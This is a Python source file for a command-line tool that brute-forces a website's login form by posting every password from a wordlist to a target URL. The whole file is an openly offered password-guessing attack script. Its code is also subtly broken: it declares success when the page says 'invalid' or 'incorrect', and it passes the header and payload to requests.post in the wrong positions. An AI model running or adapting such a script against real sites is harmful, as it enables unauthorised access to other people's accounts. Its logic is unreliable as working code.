import argparse
import sys
import requests


class WebBruteForce:

    def __init__(self):
        self.args = WebBruteForce.parse_args()
        self.header = {'User-Agent': self.args.agent}

    @staticmethod
    def parse_args():
        parser = argparse.ArgumentParser(description="Simple python login brute force script created by c4llous/riteshh00")
        parser.add_argument('--url', help="Target website url", required=True)
        parser.add_argument('--wordlist', help="path of wordlist", required=True)
        parser.add_argument('--agent', help="Username", default="Agent:Mozilla/5.0")
        args = parser.parse_args()
        return args

    def run(self):
        print("[*] User-Agent: " + self.args.agent)
        print("[*] URL: " + self.args.url)
        print("[*] Wordlist: " + self.args.wordlist)
        with open(self.args.wordlist, 'r') as f:
            words = f.read().split()
            print("[*] Starting attack...")
            for word in words:
                WebBruteForce.send(self, word)

    def send(self, password):
        payload = {'password': password, }
        r = requests.post(self.args.url, self.header, payload)
        if "invalid" in r.text or "incorrect" in r.text:
            print("[+] Correct: " + password)
            sys.exit(0)
        else:
            print("[-] Incorrect: " + password)


def main():
    WebBruteForce().run()


if __name__ == "__main__":
    main()

